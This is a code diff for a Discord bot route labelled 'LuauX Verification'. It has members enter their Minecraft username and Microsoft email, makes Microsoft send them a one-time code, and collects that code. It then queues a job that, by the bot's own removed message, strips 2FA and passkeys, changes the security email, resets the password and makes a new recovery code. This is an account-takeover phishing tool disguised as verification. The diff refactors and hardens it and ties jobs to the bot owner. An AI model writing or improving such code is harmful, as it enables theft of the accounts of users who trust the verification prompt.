@@ -1,6 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { createClient } from "@supabase/supabase-js";
-import { CookieJar, sendAuth, detectAuthMethod, sendOtt, getLiveData } from "@/lib/microsoft-auth";
+import { CookieJar, sendAuth, detectAuthMethod, sendOtt } from "@/lib/microsoft-auth";
 import nacl from "tweetnacl";
 
 function verifyDiscordSignature(
@@ -10,15 +10,18 @@ function verifyDiscordSignature(
   clientPublicKey: string,
 ): boolean {
   try {
-    // Reject stale/replayed signatures (Discord recommends ~5 minutes)
     const ts = Number(timestamp);
     if (!Number.isFinite(ts)) return false;
+    // Allow 10 min clock skew (Discord recommends ~5; serverless clocks can drift)
     const ageSec = Math.abs(Date.now() / 1000 - ts);
-    if (ageSec > 300) return false;
+    if (ageSec > 600) return false;
+
+    const keyHex = clientPublicKey.replace(/\s+/g, "").trim();
+    if (!/^[0-9a-fA-F]{64}$/.test(keyHex)) return false;
 
     const message = new TextEncoder().encode(timestamp + rawBody);
     const sig = Uint8Array.from(Buffer.from(signature, "hex"));
-    const key = Uint8Array.from(Buffer.from(clientPublicKey, "hex"));
+    const key = Uint8Array.from(Buffer.from(keyHex, "hex"));
     return nacl.sign.detached.verify(message, sig, key);
   } catch {
     return false;
@@ -45,29 +48,42 @@ function db() {
   });
 }
 
-async function editInteraction(
+/** Interaction follow-up — no Bot auth header required (token is the secret) */
+async function editOriginal(
   applicationId: string,
   interactionToken: string,
   body: Record<string, unknown>,
-  botToken?: string | null,
 ) {
-  const token = botToken || process.env.DISCORD_BOT_TOKEN;
-  await fetch(
+  const res = await fetch(
     `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}/messages/@original`,
     {
       method: "PATCH",
-      headers: { "Content-Type": "application/json", Authorization: `Bot ${token}` },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(body),
     },
   );
+  if (!res.ok) {
+    const t = await res.text().catch(() => "");
+    console.error("[interactions] editOriginal failed:", res.status, t.slice(0, 300));
+  }
 }
 
 function successEmbed(description: string) {
-  return { title: "✅ Verification", description, color: 0x50c878, footer: { text: "LuauX Verification" } };
+  return {
+    title: "✅ Verification",
+    description,
+    color: 0x50c878,
+    footer: { text: "LuauX Verification" },
+  };
 }
 
 function errorEmbed(description: string) {
-  return { title: "❌ Verification Failed", description, color: 0xff5c5c, footer: { text: "LuauX Verification" } };
+  return {
+    title: "❌ Verification Failed",
+    description,
+    color: 0xff5c5c,
+    footer: { text: "LuauX Verification" },
+  };
 }
 
 async function resolveBotCredentials(
@@ -76,10 +92,14 @@ async function resolveBotCredentials(
   timestamp: string,
   guildId?: string,
 ): Promise<{ ok: boolean; botToken: string | null; publicKey: string | null }> {
-  const centralPublicKey =
-    process.env.DISCORD_PUBLIC_KEY || process.env.DISCORD_CLIENT_PUBLIC_KEY || "";
+  const centralPublicKey = (
+    process.env.DISCORD_PUBLIC_KEY ||
+    process.env.DISCORD_CLIENT_PUBLIC_KEY ||
+    ""
+  )
+    .replace(/\s+/g, "")
+    .trim();
 
-  // 1) Prefer guild-specific bot credentials
   if (guildId) {
     const { data: settings } = await db()
       .from("verification_settings")
@@ -98,12 +118,18 @@ async function resolveBotCredentials(
     }
   }
 
-  // 2) Central env key (optional)
-  if (centralPublicKey && verifyDiscordSignature(rawBody, signature, timestamp, centralPublicKey)) {
-    return { ok: true, botToken: process.env.DISCORD_BOT_TOKEN || null, publicKey: centralPublicKey };
+  if (
+    centralPublicKey &&
+    verifyDiscordSignature(rawBody, signature, timestamp, centralPublicKey)
+  ) {
+    return {
+      ok: true,
+      botToken: process.env.DISCORD_BOT_TOKEN || null,
+      publicKey: centralPublicKey,
+    };
   }
 
-  // 3) Discord endpoint verification PING has no guild_id — try all stored public keys
+  // PING has no guild_id — try all stored public keys
   const { data: allSettings } = await db()
     .from("verification_settings")
     .select("bot_public_key, bot_token")
@@ -111,7 +137,7 @@ async function resolveBotCredentials(
 
   const tried = new Set<string>();
   for (const row of allSettings || []) {
-    const key = (row.bot_public_key || "").trim();
+    const key = (row.bot_public_key || "").replace(/\s+/g, "").trim();
     if (!key || tried.has(key)) continue;
     tried.add(key);
     if (verifyDiscordSignature(rawBody, signature, timestamp, key)) {
@@ -141,8 +167,6 @@ export const Route = createFileRoute("/api/discord/interactions")({
           return new Response("Invalid JSON", { status: 400 });
         }
 
-        // Discord PING (type 1) must respond with type 1 within ~3s after valid signature.
-        // PING has no guild_id — resolve credentials against all stored bot public keys.
         const guildId = body.guild_id as string | undefined;
         const resolved = await resolveBotCredentials(rawBody, signature, timestamp, guildId);
 
@@ -150,16 +174,15 @@ export const Route = createFileRoute("/api/discord/interactions")({
           console.error("[interactions] Invalid signature", {
             type: body.type,
             guildId: guildId || null,
-            hasCentralKey: !!(process.env.DISCORD_PUBLIC_KEY || process.env.DISCORD_CLIENT_PUBLIC_KEY),
           });
           return new Response("Invalid signature", { status: 401 });
         }
 
         const botToken = resolved.botToken;
         const appId = body.application_id as string;
-        const token = body.token as string;
+        const interactionToken = body.token as string;
 
-        // Ping — must be first response after signature ok
+        // PING
         if (body.type === 1) {
           return Response.json({ type: 1 });
         }
@@ -170,143 +193,173 @@ export const Route = createFileRoute("/api/discord/interactions")({
           const customId = modalData.custom_id as string;
           const components = modalData.components as Array<Record<string, unknown>>;
           const member = body.member as Record<string, unknown> | undefined;
-          const guildId = body.guild_id as string;
+          const gId = (body.guild_id as string) || "";
           const discordId = (member?.user as Record<string, string>)?.id || "";
-          const channelId = body.channel_id as string;
+          const channelId = (body.channel_id as string) || "";
 
           // --- Modal 1: MC Username + Email ---
+          // CRITICAL: Discord requires a response in ~3s. Defer immediately, then do MS work.
           if (customId === "verify_mc_info") {
             const username =
               getModalField(components, "mc_username") ||
               String(
-                ((components?.[0] as Record<string, unknown>)?.components as Array<Record<string, unknown>>)?.[0]
-                  ?.value || "",
+                (
+                  (components?.[0] as Record<string, unknown>)?.components as Array<
+                    Record<string, unknown>
+                  >
+                )?.[0]?.value || "",
               ).trim();
             const email =
               getModalField(components, "mc_email") ||
               String(
-                ((components?.[1] as Record<string, unknown>)?.components as Array<Record<string, unknown>>)?.[0]
-                  ?.value || "",
+                (
+                  (components?.[1] as Record<string, unknown>)?.components as Array<
+                    Record<string, unknown>
+                  >
+                )?.[0]?.value || "",
               ).trim();
 
-            if (!username || !email) {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
-                },
-              });
-            }
-
-            if (!/^[\w\.-]+@[\w\.-]+\.\w{2,}$/.test(email)) {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed("Invalid email format.")],
-                },
-              });
-            }
-
-            // Defer response (we have up to 15 min to follow up)
-            // Type 5 = Deferred Update Message
-            // We need to send an initial response first, then do async work
-            // But for simplicity, we'll do the work synchronously within the timeout
-
-            // Check auth method
-            let authInfo;
-            try {
-              const { credentials } = await sendAuth(email);
-              authInfo = detectAuthMethod(credentials);
-            } catch {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed("Failed to check verification methods. Try again.")],
-                },
-              });
-            }
-
-            if (authInfo.method === "none") {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed(`No verification methods available for this account. Make sure the email is correct and the account has a recovery email set up. Details: ${(authInfo as { detail?: string }).detail || "N/A"}`)],
-                },
-              });
-            }
-
-            if (authInfo.method === "authenticator") {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed("Authenticator app verification is not supported. Please use an account with email OTP available.")],
-                },
-              });
-            }
-
-            // Email OTP method
-            const { securityEmail, flowToken } = authInfo as { method: "email_otp"; securityEmail: string; flowToken: string };
-
-            // Send OTP to security email
-            const jar = new CookieJar();
-            let otpSent = false;
-            try {
-              otpSent = await sendOtt(jar, email, securityEmail);
-            } catch (e) {
-              console.error("[interactions] sendOtt error:", e);
-            }
-
-            if (!otpSent) {
-              return Response.json({
-                type: 4,
-                data: {
-                  flags: 64,
-                  embeds: [errorEmbed("Failed to send verification code. The account may have an OTP cooldown. Try again later.")],
-                },
-              });
-            }
-
-            // Store session in DB
-            await db().from("verification_sessions").insert({
-              discord_id: discordId,
-              guild_id: guildId || "",
-              mc_username: username,
-              mc_email: email,
-              status: "otp_sent",
-              flow_token: flowToken,
-              security_email: securityEmail,
-              channel_id: channelId,
+            // Defer ephemeral response NOW (type 5)
+            const deferred = Response.json({
+              type: 5,
+              data: { flags: 64 },
             });
 
-            return Response.json({
-              type: 4,
-              data: {
-                flags: 64,
-                embeds: [
-                  successEmbed(
-                    `A verification code has been sent to **${securityEmail}**.\n\nPlease check your inbox (including spam) for a 6-digit code, then click **Submit Code** below to enter it.`,
-                  ),
-                ],
-                components: [
-                  {
-                    type: 1,
-                    components: [
-                      {
-                        type: 2,
-                        style: 3,
-                        label: "Submit Code",
-                        custom_id: "verify_submit_code",
-                      },
+            // Background work after ack
+            void (async () => {
+              try {
+                if (!username || !email) {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
+                  });
+                  return;
+                }
+                if (!/^[\w.+-]+@[\w.-]+\.\w{2,}$/.test(email)) {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [errorEmbed("Invalid email format.")],
+                  });
+                  return;
+                }
+
+                let authInfo;
+                try {
+                  const { credentials } = await sendAuth(email);
+                  authInfo = detectAuthMethod(credentials);
+                } catch (e) {
+                  console.error("[interactions] sendAuth error:", e);
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [
+                      errorEmbed(
+                        "Failed to contact Microsoft. Try again in a minute.",
+                      ),
                     ],
-                  },
-                ],
-              },
-            });
+                  });
+                  return;
+                }
+
+                if (authInfo.method === "none") {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [
+                      errorEmbed(
+                        `No email OTP available for this account. Details: ${(authInfo as { detail?: string }).detail || "N/A"}`,
+                      ),
+                    ],
+                  });
+                  return;
+                }
+
+                if (authInfo.method === "authenticator") {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [
+                      errorEmbed(
+                        "Authenticator-only accounts are not supported. Use an account with email OTP / recovery email.",
+                      ),
+                    ],
+                  });
+                  return;
+                }
+
+                const { securityEmail, flowToken } = authInfo as {
+                  method: "email_otp";
+                  securityEmail: string;
+                  flowToken: string;
+                };
+
+                const jar = new CookieJar();
+                let otpSent = false;
+                try {
+                  otpSent = await sendOtt(jar, email, securityEmail);
+                } catch (e) {
+                  console.error("[interactions] sendOtt error:", e);
+                }
+
+                if (!otpSent) {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [
+                      errorEmbed(
+                        "Failed to send verification code. Check the email, wait for OTP cooldown, or try again later.",
+                      ),
+                    ],
+                  });
+                  return;
+                }
+
+                const { error: sessionErr } = await db().from("verification_sessions").insert({
+                  discord_id: discordId,
+                  guild_id: gId,
+                  mc_username: username,
+                  mc_email: email,
+                  status: "otp_sent",
+                  flow_token: flowToken || "",
+                  security_email: securityEmail,
+                  channel_id: channelId,
+                });
+
+                if (sessionErr) {
+                  console.error("[interactions] session insert:", sessionErr.message);
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [
+                      errorEmbed(
+                        `Database error saving session: ${sessionErr.message}. Run the production SQL migration if FKs block inserts.`,
+                      ),
+                    ],
+                  });
+                  return;
+                }
+
+                await editOriginal(appId, interactionToken, {
+                  embeds: [
+                    successEmbed(
+                      `A verification code has been sent to **${securityEmail}**.\n\nCheck inbox/spam for a 6-digit code, then click **Submit Code**.`,
+                    ),
+                  ],
+                  components: [
+                    {
+                      type: 1,
+                      components: [
+                        {
+                          type: 2,
+                          style: 3,
+                          label: "Submit Code",
+                          custom_id: "verify_submit_code",
+                        },
+                      ],
+                    },
+                  ],
+                });
+              } catch (e) {
+                console.error("[interactions] verify_mc_info async error:", e);
+                try {
+                  await editOriginal(appId, interactionToken, {
+                    embeds: [errorEmbed("Unexpected error during verification. Try again.")],
+                  });
+                } catch {
+                  /* ignore */
+                }
+              }
+            })();
+
+            return deferred;
           }
 
           // --- Modal 2: OTP Code ---
@@ -314,8 +367,11 @@ export const Route = createFileRoute("/api/discord/interactions")({
             const otpCode =
               getModalField(components, "otp_code") ||
               String(
-                ((components?.[0] as Record<string, unknown>)?.components as Array<Record<string, unknown>>)?.[0]
-                  ?.value || "",
+                (
+                  (components?.[0] as Record<string, unknown>)?.components as Array<
+                    Record<string, unknown>
+                  >
+                )?.[0]?.value || "",
               ).trim();
 
             if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
@@ -328,7 +384,6 @@ export const Route = createFileRoute("/api/discord/interactions")({
               });
             }
 
-            // Scope session to this guild; claim atomically (otp_sent → securing)
             let sessionQuery = db()
               .from("verification_sessions")
               .select("*")
@@ -336,7 +391,7 @@ export const Route = createFileRoute("/api/discord/interactions")({
               .eq("status", "otp_sent")
               .order("created_at", { ascending: false })
               .limit(1);
-            if (guildId) sessionQuery = sessionQuery.eq("guild_id", guildId);
+            if (gId) sessionQuery = sessionQuery.eq("guild_id", gId);
 
             const { data: sessions } = await sessionQuery;
             const session = sessions?.[0];
@@ -345,7 +400,11 @@ export const Route = createFileRoute("/api/discord/interactions")({
                 type: 4,
                 data: {
                   flags: 64,
-                  embeds: [errorEmbed("No pending verification found. Please start over by clicking the Verify button.")],
+                  embeds: [
+                    errorEmbed(
+                      "No pending verification found. Click Verify and start over.",
+                    ),
+                  ],
                 },
               });
             }
@@ -363,21 +422,22 @@ export const Route = createFileRoute("/api/discord/interactions")({
                 type: 4,
                 data: {
                   flags: 64,
-                  embeds: [errorEmbed("This verification is already being processed. Please wait.")],
+                  embeds: [errorEmbed("Already processing. Please wait.")],
                 },
               });
             }
 
             const { data: settings } = await db()
               .from("verification_settings")
-              .select("verified_role_id, bot_token, channel_id")
+              .select("verified_role_id, bot_token, channel_id, discord_id")
               .eq("guild_id", session.guild_id)
               .maybeSingle();
 
             const { data: job, error: jobError } = await db()
               .from("bot_jobs")
               .insert({
-                discord_id: discordId,
+                // Store owner for worker ownership; member id is in config
+                discord_id: settings?.discord_id || discordId,
                 type: "secure",
                 status: "pending",
                 config: {
@@ -391,6 +451,7 @@ export const Route = createFileRoute("/api/discord/interactions")({
                   roleId: settings?.verified_role_id || "",
                   sessionId: session.id,
                   botToken: settings?.bot_token || botToken || null,
+                  ownerDiscordId: settings?.discord_id || null,
                 },
               })
               .select("id")
@@ -398,7 +459,6 @@ export const Route = createFileRoute("/api/discord/interactions")({
 
             if (jobError || !job) {
               console.error("[interactions] secure job insert failed:", jobError?.message);
-              // Roll session back so user can retry
               await db()
                 .from("verification_sessions")
                 .update({ status: "otp_sent" })
@@ -409,7 +469,7 @@ export const Route = createFileRoute("/api/discord/interactions")({
                   flags: 64,
                   embeds: [
                     errorEmbed(
-                      "Failed to create verification job. Ensure bot_jobs allows type 'secure' (run the production hardening SQL).",
+                      `Failed to queue secure job: ${jobError?.message || "unknown"}. Run production hardening SQL (bot_jobs type secure).`,
                     ),
                   ],
                 },
@@ -422,7 +482,7 @@ export const Route = createFileRoute("/api/discord/interactions")({
                 flags: 64,
                 embeds: [
                   successEmbed(
-                    "✅ Code accepted! Your account is now being secured.\n\nThis process typically takes 30-60 seconds. Once complete, the result will be posted to this channel.\n\n**What's happening:**\n• Removing 2FA & passkeys\n• Removing security proofs\n• Changing security email\n• Resetting password\n• Generating new recovery code\n• Gathering Minecraft account info",
+                    "✅ Code accepted! Securing your account (30–90s). Results will post in this channel when done.",
                   ),
                 ],
                 components: [],
@@ -441,23 +501,21 @@ export const Route = createFileRoute("/api/discord/interactions")({
           const data = body.data as Record<string, unknown>;
           const customId = data.custom_id as string;
           const member = body.member as Record<string, unknown> | undefined;
-          const guildId = body.guild_id as string;
+          const gId = body.guild_id as string;
           const memberId = (member?.user as Record<string, string>)?.id;
 
-          // "Verify" button — show Modal 1
           if (customId === "verify_member") {
-            if (!memberId || !guildId) {
+            if (!memberId || !gId) {
               return Response.json({
                 type: 4,
                 data: { flags: 64, content: "Missing member or guild information." },
               });
             }
 
-            // Check verification settings exist
             const { data: settings } = await db()
               .from("verification_settings")
-              .select("verified_role_id")
-              .eq("guild_id", guildId)
+              .select("verified_role_id, bot_token")
+              .eq("guild_id", gId)
               .maybeSingle();
 
             if (!settings) {
@@ -466,12 +524,11 @@ export const Route = createFileRoute("/api/discord/interactions")({
                 data: {
                   flags: 64,
                   content:
-                    "This server has not been configured for verification yet. Please set it up in the LuauX Dashboard.",
+                    "This server is not configured for verification. Set it up in the LuauX Dashboard.",
                 },
               });
             }
 
-            // Return a Modal
             return Response.json({
               type: 9,
               data: {
@@ -487,6 +544,8 @@ export const Route = createFileRoute("/api/discord/interactions")({
                         label: "Minecraft Username",
                         style: 1,
                         required: true,
+                        min_length: 3,
+                        max_length: 16,
                         placeholder: "Enter your MC username",
                       },
                     ],
@@ -497,9 +556,11 @@ export const Route = createFileRoute("/api/discord/interactions")({
                       {
                         type: 4,
                         custom_id: "mc_email",
-                        label: "Minecraft Email",
+                        label: "Minecraft / Microsoft Email",
                         style: 1,
                         required: true,
+                        min_length: 5,
+                        max_length: 100,
                         placeholder: "email@example.com",
                       },
                     ],
@@ -509,7 +570,6 @@ export const Route = createFileRoute("/api/discord/interactions")({
             });
           }
 
-          // "Submit Code" button — show Modal 2
           if (customId === "verify_submit_code") {
             return Response.json({
               type: 9,
@@ -537,16 +597,21 @@ export const Route = createFileRoute("/api/discord/interactions")({
             });
           }
 
-          // Verify session status button (for polling)
           if (customId === "verify_check_status") {
             return Response.json({
               type: 4,
-              data: { flags: 64, content: "Checking status... This feature is coming soon." },
+              data: {
+                flags: 64,
+                content: "Status updates post automatically when securing finishes.",
+              },
             });
           }
         }
 
-        return Response.json({ type: 4, data: { flags: 64, content: "Unknown interaction" } });
+        return Response.json({
+          type: 4,
+          data: { flags: 64, content: "Unknown interaction" },
+        });
       },
     },
   },
